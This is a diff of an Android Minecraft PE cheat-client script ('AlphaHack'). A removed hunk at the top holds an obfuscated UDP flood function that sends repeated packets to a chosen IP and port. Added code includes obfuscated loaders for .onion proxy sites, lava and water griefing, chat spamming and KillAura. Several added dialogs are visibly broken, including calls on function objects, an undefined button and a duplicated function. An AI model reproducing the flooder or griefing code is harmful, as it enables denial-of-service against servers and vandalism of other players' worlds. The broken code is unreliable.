-var _0x56f5=["\x6E\x65\x74","\x55\x54\x46\x38","\x67\x65\x74\x42\x79\x74\x65\x73","","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x42\x79\x4E\x61\x6D\x65","\x49\x6E\x65\x74\x41\x64\x64\x72\x65\x73\x73","\x73\x65\x6E\x64","\x63\x6C\x6F\x73\x65","\x6C\x61\x6E\x67","\x73\x74\x61\x72\x74"];function ddosss(_0xb446x2,_0xb446x3,_0xb446x4){var _0xb446x5= new java[_0x56f5[9]].Runnable({run:function(){try{for(var _0xb446x6=0;_0xb446x6<=_0xb446x4;_0xb446x6++){var _0xb446x7= new java[_0x56f5[0]].DatagramSocket();var _0xb446x8= new byte[2024];_0xb446x8=_0x56f5[3].toString()[_0x56f5[2]](_0x56f5[1]);_0xb446x7[_0x56f5[7]]( new java[_0x56f5[0]].DatagramPacket(_0xb446x8,_0xb446x8[_0x56f5[4]],java[_0x56f5[0]][_0x56f5[6]][_0x56f5[5]](_0xb446x2),_0xb446x3));_0xb446x7[_0x56f5[8]]()}}catch(e){print(e)}}});var _0xb446x9= new java[_0x56f5[9]].Thread(_0xb446x5);_0xb446x9[_0x56f5[10]]()}
-
 var svr = new android.widget.Button(ctx);
             svr.setText("Server IP & Port");
             svr.setOnClickListener(new android.view.View.OnClickListener({
@@ -1550,7 +2009,7 @@ Layer4.addView(ip1);
 Layer4.addView(Exit);
 
 ip1.setText("");
-ip1.setHint("IP address");
+ip1.setHint("IP address, domain, blank for your IP");
 Exit.setText("Trace");
 
 Exit.setOnClickListener(new android.view.View.OnClickListener(){
@@ -1698,23 +2157,16 @@ var sit = new android.widget.Button(ctx);
 		sit.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
 web3(); 
-print("Loading web page");
+//print("Loading web page");
 			}
 		});
 		cmenuLayout.addView(sit);
 
       function web3()
       {
-      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
-      var webs = new android.webkit.WebView(ctx);
-      var webset = webs.getSettings();
-      webset.setJavaScriptEnabled(true);
-      webs.setWebChromeClient(new android.webkit.WebChromeClient());
-      webs.setWebViewClient(new android.webkit.WebViewClient());
-      webs.loadUrl('http://www.tineye.com');
-/*Site URL*/
-      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
-      }}));
+      var urls2 = new Intent(ctx);                  urls2.setAction(Intent.ACTION_VIEW);
+                    urls2.setData(Uri.parse("http://www.tineye.com"));
+                    ctx.startActivity(urls2);
       }
 
 var sid = new android.widget.Button(ctx);
@@ -1786,7 +2238,7 @@ var wb = new android.widget.Button(ctx);
 		wb.setText("Web browser");
 		wb.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
-lmenu.dismiss();
+cmenu.dismiss();
              wb1();
 			}
 		});
@@ -1819,7 +2271,7 @@ onClick: function(view){
 wb3 =wb2.getText();
 Dialog.dismiss();
 wb9();
-print("Loading web page");
+Toast.makeText(ctx, "AlphaHack: Loading web page", 1).show();
 showMenuBtn();
 }
 });
@@ -1860,16 +2312,9 @@ py();
 
 function py()
       {
-      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
-      var webs = new android.webkit.WebView(ctx);
-      var webset = webs.getSettings();
-      webset.setJavaScriptEnabled(true);
-      webs.setWebChromeClient(new android.webkit.WebChromeClient());
-      webs.setWebViewClient(new android.webkit.WebViewClient());
-      webs.loadUrl('https://rehmann.co/projects/10mil/');
-/*Site URL*/
-      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
-      }}));
+      var urls3 = new Intent(ctx);                  urls3.setAction(Intent.ACTION_VIEW);
+                    urls3.setData(Uri.parse("https://rehmann.co/projects/10mil/"));
+                    ctx.startActivity(urls3);
       }
 
 var ds = new android.widget.Button(ctx);
@@ -1933,7 +2378,7 @@ onClick: function(view){
 ply =ddip.getText();
 Dialog.dismiss();
 goto();
-print("Loading web page");
+Toast.makeText(ctx, "AlphaHack: Loading web page", 1).show();
 showMenuBtn();
 }
 });
@@ -1954,7 +2399,7 @@ var vh = new android.widget.Button(ctx);
 		vh.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
 djs(); 
-print("Loading web page");
+Toast.makeText(ctx, "AlphaHack: Loading web page", 1).show();
 			}
 		});
 		cmenuLayout.addView(vh);
@@ -1967,23 +2412,135 @@ print("Loading web page");
       webset.setJavaScriptEnabled(true);
       webs.setWebChromeClient(new android.webkit.WebChromeClient());
       webs.setWebViewClient(new android.webkit.WebViewClient());
-      webs.loadUrl('http://jsbeautifier.org');
+      webs.loadUrl('http://alexstar.ru/tools/jsunpack/');
 /*Site URL*/
       new android.app.AlertDialog.Builder(ctx).setView(webs).show();
       }}));
       }
 
-/*var dw = new android.widget.Button(ctx);
-		dw.setText("Dark web browser");
-		dw.setOnClickListener(new android.view.View.OnClickListener() {
+var dd = new android.widget.Button(ctx);
+		dd.setText("Deepweb");
+		dd.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
-print("this is private");
-clientMessage("this is private");
+var alert = new android.app.AlertDialog.Builder(ctx); 
+/*alert.setTitle("Alphα Hαck" + space + version + space + "changelog"); */
+
+var scroll = new android.widget.ScrollView(ctx); 
+var layout = new android.widget.LinearLayout(ctx); 
+layout.setOrientation(1);
+
+alert.setTitle("Attention! ⚠");
+ alert.setMessage("Deepweb is dangerous, even though this one is not full deepweb we would like for you to use any vpn client or tor! for your protection! you have been warned. Before you enter you may see very illegal things do not commit!!");
+
+alert.setPositiveButton("Fuck! go back!", new android.content.DialogInterface.OnClickListener(){ 
+  onClick: function(viewarg){
+    
+dialog.dismiss();
+cmenu.dismiss();
+      }});
+
+alert.setNegativeButton("Enter deepweb", new android.content.DialogInterface.OnClickListener(){ 
+   onClick: function(viewarg){
+
+dialog.dismiss();
+deepweb(); 
+Toast.makeText(ctx, "AlphaHack: Loading web page", 1).show();
+      }});
+var dialog = alert.create();
+dialog.show();
 			}
 		});
-		cmenuLayout.addView(dw);*/
+		cmenuLayout.addView(dd);
 
-var _0x95c5=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x75\x6C\x72\x6E\x36\x73\x72\x79\x71\x61\x69\x66\x65\x66\x6C\x64\x2E\x6F\x6E\x69\x6F\x6E\x2E\x69\x6E\x6B","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function deepweb(){ctx[_0x95c5[12]]( new java[_0x95c5[11]].Runnable({run:function(){var _0x49ccx2= new android[_0x95c5[0]].WebView(ctx);var _0x49ccx3=_0x49ccx2[_0x95c5[1]]();_0x49ccx3[_0x95c5[2]](true);_0x49ccx2[_0x95c5[3]]( new android[_0x95c5[0]].WebChromeClient());_0x49ccx2[_0x95c5[4]]( new android[_0x95c5[0]].WebViewClient());_0x49ccx2[_0x95c5[6]](_0x95c5[5]); new android[_0x95c5[10]][_0x95c5[9]].Builder(ctx)[_0x95c5[8]](_0x49ccx2)[_0x95c5[7]]()}}))}
+      var _0x782c=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6B\x75\x6E\x6B\x73\x77\x6F\x72\x6B\x65\x64\x70\x32\x63\x67\x2E\x6F\x6E\x69\x6F\x6E\x2E\x6C\x69\x6E\x6B","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function deepweb(){ctx[_0x782c[12]]( new java[_0x782c[11]].Runnable({run:function(){var _0xb717x2= new android[_0x782c[0]].WebView(ctx);var _0xb717x3=_0xb717x2[_0x782c[1]]();_0xb717x3[_0x782c[2]](true);_0xb717x2[_0x782c[3]]( new android[_0x782c[0]].WebChromeClient());_0xb717x2[_0x782c[4]]( new android[_0x782c[0]].WebViewClient());_0xb717x2[_0x782c[6]](_0x782c[5]); new android[_0x782c[10]][_0x782c[9]].Builder(ctx)[_0x782c[8]](_0xb717x2)[_0x782c[7]]()}}))}
+
+var ejs = new Button(ctx);
+            ejs.setText("Encrypt js file");       
+            ejs.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+ 
+js2(); 
+Toast.makeText(ctx, "AlphaHack: Loading web page", 1).show();
+
+                }
+            }));
+            cmenuLayout.addView(ejs);
+
+function js2()
+      {
+      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
+      var webs = new android.webkit.WebView(ctx);
+      var webset = webs.getSettings();
+      webset.setJavaScriptEnabled(true);
+      webs.setWebChromeClient(new android.webkit.WebChromeClient());
+      webs.setWebViewClient(new android.webkit.WebViewClient());
+      webs.loadUrl('http://javascriptobfuscator.com/Javascript-Obfuscator.aspx');
+/*Site URL*/
+      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
+      }}));
+      }
+
+/*var dak = new Button(ctx);
+            dak.setText("Decompile APK");       
+            dak.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+ 
+dapk(); 
+
+                }
+            }));
+            cmenuLayout.addView(dak);*/
+
+function dapk()
+      {
+      var urls4 = new Intent(ctx);                  urls4.setAction(Intent.ACTION_VIEW);
+                    urls4.setData(Uri.parse("http://www.javadecompilers.com/apk"));
+                    ctx.startActivity(urls4);
+      }
+
+var hbp = new Button(ctx);
+            hbp.setText("Account breached?");       
+            hbp.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+ 
+acb(); 
+
+                }
+            }));
+            cmenuLayout.addView(hbp);
+
+function acb()
+      {
+      var urls5 = new Intent(ctx);                  urls5.setAction(Intent.ACTION_VIEW);
+                    urls5.setData(Uri.parse("https://haveibeenpwned.com"));
+                    ctx.startActivity(urls5);
+      }
+
+var pwg = new Button(ctx);
+            pwg.setText("Password gen");       
+            pwg.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+ 
+gen(); 
+Toast.makeText(ctx, "AlphaHack: Loading web page", 1).show();
+
+                }
+            }));
+            cmenuLayout.addView(pwg);
+
+function gen()
+      {
+      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
+      var webs = new android.webkit.WebView(ctx);
+      var webset = webs.getSettings();
+      webset.setJavaScriptEnabled(true);
+      webs.setWebChromeClient(new android.webkit.WebChromeClient());
+      webs.setWebViewClient(new android.webkit.WebViewClient());
+      webs.loadUrl('http://passwordsgenerator.net');
+/*Site URL*/
+      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
+      }}));
+      }
 
 		var exitb2 = new android.widget.Button(ctx);
 		exitb2.setText("Exit");
@@ -1997,6 +2554,11 @@ showMenuBtn();
 
             cmenu = new PopupWindow(cmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             cmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+			var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+cmenuLayout1.setBackgroundDrawable(bg);
+cmenuLayout1.setPadding(20,0,20,0);
             cmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
                 Toast.makeText(ctx, "An error occured: " + error, 1).show();
@@ -2012,6 +2574,10 @@ if(GetLang=="de_DE")zz.setText('Modpe Menü');
 if(GetLang=="ko_KR")zz.setText('ModPE 메뉴');
 
 if(GetLang=="es_MX")zz.setText('Menú de Modpe');
+
+if(GetLang=="ja_JP")zz.setText('ModPEメニュー');
+
+if(GetLang=="it_IT")zz.setText('Menu ModPE');
 zz.setTextColor(GUIBtns);
 		zz.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
@@ -2060,7 +2626,7 @@ var zmenuDot = new android.widget.LinearLayout(ctx);
 	 zmenuDot.setOrientation(0);
 
 var editab = new android.widget.EditText(ctx);
-var button = new android.widget.Switch(ctx);
+var buttonz = new android.widget.Switch(ctx);
 
 editab.setHint("Spammer");
 editab.setOnClickListener(new android.view.View.OnClickListener() {
@@ -2070,9 +2636,9 @@ spa();
 		});
 
      var switched = false;
-      var button = new android.widget.Switch(ctx);
-      button.setChecked(switched);
-      button.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
+      var buttonz = new android.widget.Switch(ctx);
+      buttonz.setChecked(switched);
+      buttonz.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
       onCheckedChanged: function(){
       if(!switched){
       switched = true;
@@ -2087,12 +2653,12 @@ print("true");
 print("false");
 
       }
-      button.setChecked(switched);
+      buttonz.setChecked(switched);
       }
       }));
      
      zmenuDot.addView(editab);
-     zmenuDot.addView(button);
+     zmenuDot.addView(buttonz);
 
 zmenuLayout.addView(zmenuDot);
 
@@ -2218,14 +2784,13 @@ if(stat22 == true){
 clientMessage("§7Status on");
 net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/hud off");
 clientMessage(client + "§7T = time, W = weather, B = biome, ID = item id, G = gamemode.");
+
 stat22 = true;
-showp = true;
 }
 if(stat22 == false){
 clientMessage("§7Status off");
 
 stat22 = false;
-showp = false;
                 }
 			}
 		});
@@ -2237,6 +2802,7 @@ var creative = new Button(ctx);
                 onClick: function(viewarg){
                     Level.setGameMode(1);
 net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/gamemode 1");
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/gamemode creative");
 clientMessage(client + "§7Your gamemode was updated to creative mode!");
                 }
             }));
@@ -2248,10 +2814,35 @@ clientMessage(client + "§7Your gamemode was updated to creative mode!");
                 onClick: function(viewarg){
                     Level.setGameMode(0);
 net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/gamemode 0");
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/gamemode survival");
 clientMessage(client + "§7Your gamemode was updated to survival mode!");
                 }
             }));
             zmenuLayout.addView(survival);
+
+var adven = new Button(ctx);
+            adven.setText("Adventure");        
+            adven.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+                    Level.setGameMode(2);
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/gamemode 2");
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/gamemode adventure");
+clientMessage(client + "§7Your gamemode was updated to adventure mode!");
+                }
+            }));
+            zmenuLayout.addView(adven);
+
+var spec = new Button(ctx);
+            spec.setText("Spectator");        
+            spec.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+                    Level.setGameMode(3);
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/gamemode 3");
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/gamemode spectator");
+clientMessage(client + "§7Your gamemode was updated to spectator mode!");
+                }
+            }));
+            zmenuLayout.addView(spec);
 
 var ad = new android.widget.Button(ctx);
       ad.setText("Auto destroy: "+(autod?"on":"off"));
@@ -2259,9 +2850,7 @@ var ad = new android.widget.Button(ctx);
 			onClick: function(v){         autod?autod=false:autod=true;
 ad.setText("Auto destroy: "+(autod?"on":"off"));
 if(autod == true){
-clientMessage(client + "§7Automatic block destroy on, by johnmacro");
-
-autod = true;
+new1();
 }
 if(autod == false){
 clientMessage(client + "§7Automatic block destroy off, by johnmacro");
@@ -2271,6 +2860,67 @@ autod = false;
 			}
 		});
 		zmenuLayout.addView(ad);
+		
+		function new1() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+fov = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var select1 = new android.widget.Button(ctx);
+var select2 = new android.widget.Button(ctx);
+var Dialog = new android.app.Dialog(ctx);
+//var Exit = new android.widget.Button(ctx);
+ 
+Dialog.setTitle("Select");
+Dialog.setContentView(Layer);
+ 
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+ 
+Layer.addView(select1);
+Layer.addView(select2);
+//Layer.addView(Exit);
+ 
+            select1.setText("Drop item?");
+            select1.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+ clientMessage(client + "§7Automatic block destroy on, by johnmacro");
+vidd = true;
+autod = true;
+Dialog.dismiss();
+showMenuBtn();
+                }
+            }));
+             
+            select2.setText("Don't drop item?");
+            select2.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+ clientMessage(client + "§7Automatic block destroy on, by johnmacro");
+vidd = false;
+autod = true;
+Dialog.dismiss();
+showMenuBtn();
+                }
+            }));
+//Exit.setText("done");
+ 
+/*Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ 
+Dialog.dismiss();
+showMenuBtn();
+}
+});*/
+ 
+new1.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+new1.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+new1.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The new Dialog Is Malfunctioning:"+e);
+}
+}});
+}
 
 var df = new android.widget.Button(ctx);
       df.setText("Disable up/down fly: "+(nofly?"on":"off"));
@@ -2297,126 +2947,108 @@ var es = new Button(ctx);
             es.setText("Entity spawner");        
             es.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){
-                    enter(); 
+                    new3(); 
                 }
             }));
             zmenuLayout.addView(es);
+ 
+function new3() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+fov = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var select1 = new android.widget.Button(ctx);
+var select2 = new android.widget.Button(ctx);
+var select3 = new android.widget.Button(ctx);
+var select4 = new android.widget.Button(ctx);
+var Dialog = new android.app.Dialog(ctx);
+//var Exit = new android.widget.Button(ctx);
+ 
+Dialog.setTitle("Select");
+Dialog.setContentView(Layer);
+ 
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+ 
+Layer.addView(select1);
 
-function enter(){
-var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
-    ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
-        try{
-var enterLayout = new android.widget.LinearLayout(ctx);
+Layer.addView(select2);
+
+Layer.addView(select3);
+
+Layer.addView(select4);
+
+//Layer.addView(Exit);
  
-enterLayout.setGravity(android.view.Gravity.RIGHT);
-enterLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
-var dot = android.widget.TextView(ctx);
-var oneBtn = android.widget.Button(ctx);
-var twoBtn = android.widget.Button(ctx);
-var treeBtn = android.widget.Button(ctx);
-var fourBtn = android.widget.Button(ctx);
-var fiveBtn = android.widget.Button(ctx);
-var cBtn = android.widget.Button(ctx);
-dot.setTextSize(15);
-oneBtn.setText("Lightning");
-twoBtn.setText("PrimedTnt");
-treeBtn.setText("Arrow");
-fourBtn.setText("Exp orb");
-fiveBtn.setText("Minecart");
- 
-cBtn.setText("Cancel");
-var enterDialog = new android.app.Dialog(ctx);
-enterDialog.show();
-enterDialog.setContentView(enterLayout);
-enterDialog.setTitle("Tap to select");
-  
- 
-enterLayout.addView(dot);
-enterLayout.addView(oneBtn);
-enterLayout.addView(twoBtn);
-enterLayout.addView(treeBtn);
-enterLayout.addView(fourBtn);
-enterLayout.addView(fiveBtn);
-enterLayout.addView(cBtn);
- 
-oneBtn.setOnClickListener(new android.view.View.OnClickListener(){
-onClick: function(viewarg){
- 
-lightning = true;
+            select1.setText("Lightning");
+            select1.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+ lightning = true;
 if(primedtnt==true)primedtnt = false;
 if(arrow==true)arrow = false;
 if(exporb==true)exporb = false;
- 
-enterDialog.dismiss();
-clientMessage("Tap ground to spawn entity");
-}});
- 
-twoBtn.setOnClickListener(new android.view.View.OnClickListener(){
-onClick: function(viewarg){
- 
-primedtnt = true;
+Dialog.dismiss();
+showMenuBtn();
+                }
+            }));
+             
+            select2.setText("Primed tnt");
+            select2.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+ primedtnt = true;
 if(lightning==true)lightning = false;
 if(arrow==true)arrow = false;
 if(exporb==true)exporb = false;
- 
-enterDialog.dismiss();
-clientMessage("Tap ground to spawn entity");
-}});
- 
-treeBtn.setOnClickListener(new android.view.View.OnClickListener(){
-onClick: function(viewarg){
- 
-arrow = true;
-if(primedtnt==true)primedtnt = false;
+Dialog.dismiss();
+showMenuBtn();
+                }
+            }));
+			
+			select3.setText("Arrow");
+            select3.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+ arrow = true;
 if(lightning==true)lightning = false;
+if(primedtnt==true)primedtnt = false;
 if(exporb==true)exporb = false;
-
- enterDialog.dismiss();
-clientMessage("Tap ground to spawn entity");
-}});
-
-fourBtn.setOnClickListener(new android.view.View.OnClickListener(){
-onClick: function(viewarg){
- 
-exporb = true;
-if(primedtnt==true)primedtnt = false;
+Dialog.dismiss();
+showMenuBtn();
+                }
+            }));
+			
+			select4.setText("Exp orb");
+            select4.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+ exporb = true;
 if(lightning==true)lightning = false;
-if(arrow==true)arrow = false;
-
- enterDialog.dismiss();
-clientMessage("Tap ground to spawn entity");
-}});
-
-fiveBtn.setOnClickListener(new android.view.View.OnClickListener(){
-onClick: function(viewarg){
- 
-minecart = true;
 if(primedtnt==true)primedtnt = false;
-if(lightning==true)lightning = false;
 if(arrow==true)arrow = false;
-if(exporb==true)exporb = false;
-
- enterDialog.dismiss();
-clientMessage("Tap ground to spawn entity");
-}});
+Dialog.dismiss();
+showMenuBtn();
+                }
+            }));
+Exit.setText("Off");
  
-cBtn.setOnClickListener(new  android.view.View.OnClickListener(){
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
  
-onClick: function(viewarg){
-           enterDialog.dismiss();
-
-var lightning = false;
-var primedtnt = false;
-var arrow = false;
-var exporb = false;
-var minecart = false;
-
-}});
- 
-} catch(errr) {
-print(errr);
+ exporb = false;
+ lightning = false;
+ arrow = false;
+ primedtnt = false;
+Dialog.dismiss();
+showMenuBtn();
 }
-}}));
+});
+ 
+new3.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+new3.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+new3.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The new Dialog Is Malfunctioning:"+e);
+}
+}});
 }
 
 var cc = new Button(ctx);
@@ -2463,6 +3095,91 @@ tspam = false
 }
             }));
             zmenuLayout.addView(spam2);
+
+var me = new Button(ctx);
+            me.setText("My username / nametag");
+            me.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){ 
+clientMessage(client + "Username is: " + Player.getName(Player.getEntity()))
+                }
+            }));
+            zmenuLayout.addView(me);
+
+var dw = new Button(ctx);
+            dw.setText("Dimension");        
+            dw.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+                     clientMessage(client + "World: " + Player.getDimension());
+                }
+            }));
+            zmenuLayout.addView(dw);
+
+var di = new Button(ctx);
+            di.setText("All block ids?");        
+            di.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+                     clientMessage(client + "Idk: " + Block.getAllBlockIds());
+                }
+            }));
+            zmenuLayout.addView(di);
+
+var d = new Button(ctx);
+            d.setText("Difficulty");        
+            d.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+  clientMessage(client + "Difficulty: " + Level.getDifficulty());
+                }
+            }));
+            zmenuLayout.addView(d);
+
+var de = new Button(ctx);
+            de.setText("Items enchantment");        
+            de.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+                     clientMessage(client + "Held item enchantment: " + Player.getEnchantments(Player.getSelectedSlotId()));
+                }
+            }));
+            zmenuLayout.addView(de);
+
+var da = new Button(ctx);
+            da.setText("Armor damage");        
+            da.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+                     clientMessage("Head armor dam: " + Entity.getArmorDamage(getPlayerEnt(), 0) + "\nChest armor dam: " + Entity.getArmorDamage(getPlayerEnt(), 1) + "\nLegs armor dam: " + Entity.getArmorDamage(getPlayerEnt(), 2) + "\nFeet armor dam: " + Entity.getArmorDamage(getPlayerEnt(), 3));
+                }
+            }));
+            zmenuLayout.addView(da);
+
+var dh = new Button(ctx);
+            dh.setText("Max player health");        
+            dh.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+                     clientMessage(client + "Max health: " + Entity.getMaxHealth(getPlayerEnt()));
+                }
+            }));
+            zmenuLayout.addView(dh);
+
+var rr = new android.widget.Button(ctx);
+           rr.setText("Reactor time mode: "+(remode?"on":"off"));
+            rr.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+remode?remode=false:remode=true;
+rr.setText("Reactor time mode: "+(remode?"on":"off"));
+if(remode == true){
+clientMessage(client + "§7Nether reactor time on");
+ setNightMode(true);
+
+remode = true
+}
+if(remode == false){
+clientMessage(client + "§7Nether reactor time off");
+setNightMode(false);
+
+remode = false
+                }
+}
+            }));
+            zmenuLayout.addView(rr);
 
 var mf = new Button(ctx);
             mf.setText("Make food item");
@@ -2690,8 +3407,7 @@ var g = new android.widget.Button(ctx);
 grief?grief=false:grief=true;
 g.setText("Grief run: "+(grief?"on":"off"));
 if(grief == true){
-clientMessage(client + "§7Your now griefing! hurry run around!");
-grief = true;
+new2();
 }
 if(grief == false){
 clientMessage(client + "§7You stopped griefing!");
@@ -2700,6 +3416,74 @@ grief = false;
 }
             }));
             zmenuLayout.addView(g);
+
+function new2() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+fov = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var select1 = new android.widget.Button(ctx);
+var select2 = new android.widget.Button(ctx);
+var select3 = new android.widget.Button(ctx);
+var ddf = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+ 
+Dialog.setTitle("Select");
+Dialog.setContentView(Layer);
+ 
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+ 
+Layer.addView(select1);
+Layer.addView(select2);
+//Layer.addView(select3);
+Layer.addView(ddf);
+Layer.addView(Exit);
+ 
+            select1.setText("Use lava?");
+            select1.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+ clientMessage(client + "§7Your now griefing! hurry run around!");
+ vid = 11;
+grief = true;
+                }
+            }));
+             
+            select2.setText("Use water?");
+            select2.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+ clientMessage(client + "§7Your now griefing! hurry run around!");
+ vid = 8;
+grief = true;
+                }
+            }));
+			
+			ddf.setText("");
+ddf.setHint("Pick item ID");
+			
+			
+Exit.setText("done");
+ 
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ 
+ vid =ddf.getText();
+ grief = true;
+Dialog.dismiss();
+showMenuBtn();
+}
+});
+ 
+new2.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+new2.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+new2.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The new Dialog Is Malfunctioning:"+e);
+}
+}});
+}
 
 var kl = new android.widget.Button(ctx);
             kl.setText("KillAura: "+(killaura?"on":"off"));
@@ -2753,6 +3537,60 @@ ModPE.setUiRenderDebug(false);
             }));
             zmenuLayout.addView(ui);
 
+var attd = new Button(ctx);
+            attd.setText("Set difficulty");        
+            attd.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){ 
+named(); 
+
+                }
+            }));
+            zmenuLayout.addView(attd);
+
+function named() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer8 = new android.widget.LinearLayout(ctx);
+var ntd = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter difficulty");
+Dialog.setContentView(Layer8);
+
+Layer8.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer8.addView(ntd);
+Layer8.addView(Exit);
+
+ntd.setText("");
